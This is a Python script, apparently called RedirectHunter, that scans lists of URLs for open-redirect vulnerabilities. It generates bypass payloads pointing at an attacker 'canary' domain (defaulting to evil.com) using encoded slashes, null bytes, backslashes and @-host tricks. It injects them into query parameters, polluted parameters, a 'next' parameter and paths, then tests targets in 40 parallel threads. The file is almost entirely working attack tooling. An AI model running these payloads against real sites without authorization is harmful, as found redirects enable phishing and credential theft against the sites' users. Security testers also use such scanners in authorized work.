import requests
import sys
import time
import re
import argparse
import os
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────
THREADS = 40
TIMEOUT = 10
MAX_RETRIES = 2
MAX_BODY_SIZE = 2_000_000

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (RedirectHunter-Final/2026)"})
adapter = requests.adapters.HTTPAdapter(pool_maxsize=THREADS)
session.mount("http://", adapter)
session.mount("https://", adapter)

# ─────────────────────────────────────────
# HOST MATCHING – Strict exact host
# ─────────────────────────────────────────
def normalize_host(url_str: str) -> str:
    try:
        decoded = unquote(unquote(url_str))
        if decoded.startswith("//"):
            decoded = "http:" + decoded
        parsed = urlparse(decoded)
        return parsed.netloc.lower().rstrip('.')
    except Exception:
        return ""

def matches_canary(location: str, canary: str) -> bool:
    if not location:
        return False
    try:
        parsed_location = urlparse(unquote(unquote(location)))
        parsed_canary = urlparse(canary)
        location_host = parsed_location.netloc.lower().rstrip('.')
        canary_host = parsed_canary.netloc.lower().rstrip('.')
        return location_host == canary_host
    except Exception:
        return False

# ─────────────────────────────────────────
# PAYLOADS
# ─────────────────────────────────────────
def generate_payloads(canary: str, advanced: bool = False) -> list[str]:
    parsed = urlparse(canary)
    domain = parsed.netloc or "evil.com"
    scheme = parsed.scheme or "https"

    base = [
        canary,
        f"//{domain}",
        f"///{domain}",
        f"/////{domain}",
        f"//{domain}//",
        f"%2F%2F{domain}",
        f"%252F%252F{domain}",
        f"{scheme}:{domain}",
        f"\\{domain}",
        f"/{domain}",
        f"{domain}/",
        f"{scheme}://{domain}%00",
        f"{domain}%2e",
        f"https://{domain}%09",
        f"//%5c{domain}",
        f"%5c{domain}",
        f"{domain}%00.com",
    ]

    if advanced:
        base.extend([
            f"〱{domain}",
            f"%09/{domain}",
            f"%20{domain}",
            f"//{domain}%20@trusted.com",
            f"https://{domain}.trusted.com",
            f"//{scheme}://{domain}",
        ])

    return sorted(set(base))

# ─────────────────────────────────────────
# INJECTION – One parameter at a time
# ─────────────────────────────────────────
def should_inject(url: str) -> bool:
    return bool(urlparse(url).query)

def generate_per_param_replacements(url: str, payload: str) -> list[str]:
    parsed = urlparse(url)
    if not parsed.query:
        return []
    params = parse_qsl(parsed.query, keep_blank_values=True)
    injected = []
    for i in range(len(params)):
        new_params = params[:]
        k = new_params[i][0]
        new_params[i] = (k, payload)
        new_query = urlencode(new_params, doseq=True)
        injected.append(urlunparse(parsed._replace(query=new_query)))
    return injected

def inject_pollution(url: str, payload: str) -> str | None:
    parsed = urlparse(url)
    if not parsed.query:
        return None
    params = parse_qsl(parsed.query, keep_blank_values=True)
    new_params = params + [(k, payload) for k, _ in params]
    new_query = urlencode(new_params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

def generate_nested_injection(url: str, payload: str) -> list[str]:
    parsed = urlparse(url)
    new_params = parse_qsl(parsed.query, keep_blank_values=True)
    new_params.append(("next", payload))
    new_query = urlencode(new_params, doseq=True)
    return [urlunparse(parsed._replace(query=new_query))]

def inject_path_based(url: str, payload: str) -> str | None:
    parsed = urlparse(url)
    if not parsed.path or parsed.path == "/":
        return None
    new_path = f"{parsed.path.rstrip('/')}/{payload.lstrip('/')}"
    return urlunparse(parsed._replace(path=new_path, query=""))

# ─────────────────────────────────────────
# VALIDATION – Tiered Model
# ─────────────────────────────────────────
def validate(url: str, canary: str, research: bool = False) -> dict:
    result = {
        "url": url,
        "status": "CLEAN",
        "severity": 0,
        "details": {},
        "suspicious": False
    }

    # CONFIRMED: Final host match after full follow
    try:
        r_follow = session.get(url, allow_redirects=True, timeout=TIMEOUT)
        final_host = urlparse(r_follow.url).netloc.lower().rstrip('.')
        canary_host = urlparse(canary).netloc.lower().rstrip('.')
        if final_host == canary_host:
            result["status"] = "CONFIRMED"
            result["severity"] = 10
            result["details"] = {
                "type": "FINAL_REDIRECT",
                "hops": len(r_follow.history),
                "final_url": r_follow.url
            }
            return result
    except requests.RequestException:
        pass

    # Prepare no-follow request
    r_no_follow = None
    try:
        r_no_follow = session.get(url, allow_redirects=False, timeout=TIMEOUT)
    except requests.RequestException:
        pass

    # LIKELY: 30X Location header
    if r_no_follow and r_no_follow.status_code in (301, 302, 303, 307, 308):
        location = r_no_follow.headers.get("Location")
        if location:
            absolute = requests.compat.urljoin(r_no_follow.url, location)
            if matches_canary(absolute, canary):
                result["status"] = "LIKELY"
                result["severity"] = 8
                result["details"] = {"type": "DIRECT_LOCATION_MATCH", "location": absolute}
                return result

    # LIKELY: JS / Meta
    if r_no_follow and r_no_follow.status_code == 200:
        body = r_no_follow.text
        if len(body) > MAX_BODY_SIZE:
            return result

        target_host = normalize_host(canary)

        js_pattern = re.compile(
            r'(?:window|document|self|top|parent)\.(?:location\s*=\s*|href\s*=\s*|assign\s*\(|replace\s*\()'
            r'["\']?https?://[^"\')]*' + re.escape(target_host),
            re.IGNORECASE
        )
        if js_pattern.search(body):
            result["status"] = "LIKELY"
            result["severity"] = 6
            result["details"] = {"type": "JS_PATTERN"}
            return result

        meta_pattern = re.compile(
            r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^"\']*;\s*url\s*=\s*https?://[^"\']*' +
            re.escape(target_host),
            re.IGNORECASE | re.DOTALL
        )
        if meta_pattern.search(body):
            result["status"] = "LIKELY"
            result["severity"] = 5
            result["details"] = {"type": "META_REFRESH"}
            return result

        # SUSPICIOUS: reflection (research only)
        if research:
            reflection_pattern = re.compile(
                r'https?://[^"\')<>\s]*' + re.escape(target_host),
                re.IGNORECASE
            )
            if reflection_pattern.search(body):
                result["status"] = "SUSPICIOUS"
                result["severity"] = 3
                result["details"] = {"type": "REFLECTION"}

    return result

# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Open Redirect Validator")
    parser.add_argument("url_file", help="File with URLs to test")
    parser.add_argument("canary", help="Evil canary URL")
    parser.add_argument("--research", action="store_true")
    parser.add_argument("--advanced", action="store_true")
    args = parser.parse_args()

    try:
        with open(args.url_file, encoding="utf-8") as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: File not found → {args.url_file}")
        sys.exit(1)

    filtered_urls = [u for u in urls if bool(urlparse(u).query)]
    print(f"[+] Parameterized URLs: {len(filtered_urls)} / {len(urls)}")

    payloads = generate_payloads(args.canary, advanced=args.advanced)

    injected_urls = set()
    for url in filtered_urls:
        for payload in payloads:
            for inj in generate_per_param_replacements(url, payload):
                injected_urls.add(inj)
            polluted = inject_pollution(url, payload)
            if polluted:
                injected_urls.add(polluted)
            for n in generate_nested_injection(url, payload):
                injected_urls.add(n)
            path_inj = inject_path_based(url, payload)
            if path_inj:
                injected_urls.add(path_inj)

    print(f"[+] Generated {len(injected_urls)} candidates")

    confirmed = []
    likely = []
    suspicious = []

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [
            executor.submit(validate, u, args.canary, args.research)
            for u in injected_urls
        ]
        for future in as_completed(futures):
            res = future.result()
            if res["status"] == "CONFIRMED":
                confirmed.append(res["url"])
                print(f"[CONFIRMED] {res['url']}")
            elif res["status"] == "LIKELY":
                likely.append(res["url"])
                print(f"[LIKELY] {res['url']} (sev {res['severity']})")
            elif res["status"] == "SUSPICIOUS":
                suspicious.append(res["url"])
                print(f"[SUSPICIOUS] {res['url']} (sev {res['severity']})")

    # Write to files in CURRENT DIRECTORY (run folder)
    with open("confirmed_redirects.txt", "w", encoding="utf-8") as f:
        for u in sorted(set(confirmed)):
            f.write(f"{u}\n")

    with open("likely_redirects.txt", "w", encoding="utf-8") as f:
        for u in sorted(set(likely)):
            f.write(f"{u}\n")

    with open("suspicious_redirects.txt", "w", encoding="utf-8") as f:
        for u in sorted(set(suspicious)):
            f.write(f"{u}\n")

    print("\n" + "═" * 50)
    print(f"[+] CONFIRMED:   {len(confirmed)}  → confirmed_redirects.txt")
    print(f"[+] LIKELY:      {len(likely)}  → likely_redirects.txt")
    print(f"[+] SUSPICIOUS:  {len(suspicious)}  → suspicious_redirects.txt")
    print("═" * 50)

if __name__ == "__main__":
    main()
